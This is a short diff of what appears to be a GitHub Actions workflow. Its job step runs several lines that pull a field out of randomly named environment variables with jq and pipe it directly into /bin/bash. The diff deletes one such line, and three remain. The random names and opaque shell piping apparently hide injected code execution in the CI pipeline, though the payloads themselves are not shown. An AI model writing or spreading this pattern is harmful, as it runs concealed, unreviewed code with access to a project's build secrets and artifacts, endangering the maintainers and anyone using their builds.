@@ -28,7 +28,6 @@ jobs:
           echo $sgjay84390 | jq -r .piwq99334 | /bin/bash
           echo $q4213 | jq -r .jdpc968 | /bin/bash
           echo $z23 | jq -r .xhs04 | /bin/bash
-          printf '%s' "$igasf2609" | jq -r .byt13 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
